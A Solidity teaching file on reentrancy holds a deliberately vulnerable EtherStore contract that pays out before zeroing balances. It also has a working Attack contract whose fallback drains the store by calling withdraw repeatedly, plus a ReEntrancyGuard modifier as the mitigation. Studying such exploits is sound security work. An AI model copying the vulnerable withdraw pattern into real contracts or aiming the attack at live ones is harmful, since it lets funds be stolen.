// Let's say that contract A calls contract B
// Reentrancy exploit allows B to call back into A before A finishes execution

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal>0);

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "failed to sent ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;
    uint constant public AMOUNT  = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore= EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if(address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    // Helper function to get the balance of this contract
    function getBalance() public view returns (uint) {
         return address(this).balance;
    }
}

contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}